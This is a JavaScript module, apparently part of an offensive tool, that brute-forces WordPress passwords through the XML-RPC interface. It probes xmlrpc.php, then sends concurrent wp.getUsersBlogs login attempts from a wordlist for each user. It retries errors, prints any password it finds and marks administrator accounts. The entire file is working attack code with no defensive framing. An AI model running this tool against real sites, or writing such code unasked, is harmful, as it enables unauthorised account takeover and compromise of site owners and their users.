import * as utils from '../lib/utils.js'
import fetch from 'node-fetch'
import * as cheerio from 'cheerio'
import { appConfig } from '../config/appConfig.js'
import pLimit from 'p-limit'
import cliProgress from 'cli-progress'


/**
 * Check if WordPress instance has XML-RPC enable
 *
 * @async
 * @param {string} host - The host to check from
 * @returns {Promise<boolean>}
 */
async function isXmlRpcEnable(host) {
    try {
        const xmlGetUsersBlogData = await utils.readFile('./XML/xmlrpc-sayHello.xml')
        const response = await fetch(host + '/xmlrpc.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/xml' },
            body: xmlGetUsersBlogData
        })
        // Parse XML file
        const text = await response.text()

        return text.search("Hello!") !== -1
    } catch (error) {
        utils.logging.error(error)
        return false
    }
}

/**
 * Use getUsersBlogs XML-RPC call for credential validation, if valid check if user is an admin
 *
 * @async
 * @param {string} host - Hostname url
 * @param {string} xmlData - XML form to call wp.getUsersBlog
 * @param {string} user - User to try
 * @param {string} password - Password to try
 * @returns {Promise<{}|{ isValid: boolean, user: string, password: string, isAdmin: boolean }>} - Credential
 */
async function xmlLogin(host, xmlData, user, password) {
    let credential = { isValid: false }

    try {
        const chars = { '{{user}}': user, '{{password}}': password }
        const xmlGetUsersBody = utils.strReplace(xmlData, chars)
        const response = await fetch(host + '/xmlrpc.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/xml',
                'User-Agent': appConfig.bruteforce.userAgent
            },
            body: xmlGetUsersBody
        })

        // Parse XML file
        const xmlResponse = await response.text()
        const $ = cheerio.load(xmlResponse, { xml: true })

        // Check if we have a valid login
        if ($('methodResponse').length !== 0 && $('fault').length === 0) {
            credential.isValid = true
            credential['user'] = user
            credential['password'] = password
            credential['isAdmin'] = false

            // Check if user is Admin
            if ($('member value boolean').text() === '1') {
                credential['isAdmin'] = true
            }
        }
    } catch (error) {
        console.error(error)
        throw Object.assign(new Error(error), { user, password })
    }

    return credential
}

/**
 * Use XML-RPC to brute force passwords for a list of users
 *
 * @async
 * @param {string} host
 * @param {array} users - List of users
 * @returns {Promise<array<{}|{ isValid: boolean, user: string, password: string, isAdmin: boolean }>>}
 */
async function bruteForcePassword(host, users) {
    const xmlGetUsersBlogData = await utils.readFile('./XML/xmlrpc-getUsersBlog.xml')
    const pathToWordlist = appConfig.app.rootPath + appConfig.bruteforce.wordlist
    const passwordsChunks = await utils.wordlistSplitting(pathToWordlist)
    let admins = []
    let nonAdmins = []

    for (let user of users) {
        if (admins.length > 0) {
            break
        }

        console.log(`\t- Bruteforce for user ${ utils.textColoring(user, 'blue') }`)
        const progressBar = new cliProgress.SingleBar(
            { align: 'left', clearOnComplete: true },
            cliProgress.Presets.shades_classic
        )
        progressBar.start(passwordsChunks.totalSize, 0)

        for (let [index, chunk] of passwordsChunks.chunks.entries()) {
            const credential = await LoginXmlBruteForce(host, xmlGetUsersBlogData, user, chunk)
            progressBar.increment(chunk.length)

            if (utils.isEmptyObject(credential) && index === (passwordsChunks.chunks.length - 1)) {
                progressBar.stop()
                console.info(utils.printCheck.failure() + " No credential was found for user: " +
                    utils.textColoring(user, 'blue')
                )
            }

            if (!utils.isEmptyObject(credential)) {
                progressBar.stop()
                let credentialsLog = utils.printCheck.success() +
                    " Found password " + "\"" + utils.textColoring(credential.password, 'green') +
                    "\"" + " for user: " + utils.textColoring(credential.user, 'blue')

                if (credential.isAdmin) {
                    credentialsLog = credentialsLog + ` (Administrator)`
                    admins.push(credential)
                } else {
                    nonAdmins.push(credential)
                }

                console.log(credentialsLog)
                break
            }
        }
    }

    if (!admins.length && !nonAdmins.length) {
        console.log(`${ utils.printCheck.failure() } No credential found, quitting ...`)
        utils.exit(0)
    }

    return admins.concat(nonAdmins)
}

/**
 * Use wordlist to brute force users password by calling XML-RPC
 *
 * @async
 * @param {string} host
 * @param {string} xmlGetUsersBlogData - XML data to send
 * @param {string} user - User to try
 * @param {array<string>} wordlist - Chunk of password
 * @param {number} [maxRetry=3] - Max retry if error
 * @returns {Promise<Object.<{}|{ isValid: boolean, user: string, password: string, isAdmin: boolean }>>}
 */
async function LoginXmlBruteForce(host, xmlGetUsersBlogData, user, wordlist, maxRetry = 3) {
    let credential = {}
    let requeue = []
    let foundPassword = false
    const limit = pLimit(appConfig.bruteforce.concurrencyLimit)

    const promises = wordlist.map(password => {
        return limit(() => xmlLogin(host, xmlGetUsersBlogData, user, password))
    })

    try {
        const result = await Promise.allSettled(promises)

        for (let promise of result) {
            if (promise.status === "fulfilled") {
                if (promise.value.isValid) {
                    credential = promise.value
                    foundPassword = true
                    break
                }
            } else {
                requeue.push(promise.reason.password)
                console.error(
                    `Error while login attempt for user ${ promise.reason.user } using password ${ promise.reason.password }.
                    Error :\n${ promise.reason.message }`
                )
            }
        }

        if (!foundPassword && requeue.length && maxRetry > 0) {
            maxRetry = maxRetry - 1
            await LoginXmlBruteForce(host, xmlGetUsersBlogData, user, requeue, maxRetry)
        }
    } catch (e) {
        console.error(e)
    }

    return credential
}


export { isXmlRpcEnable, bruteForcePassword }
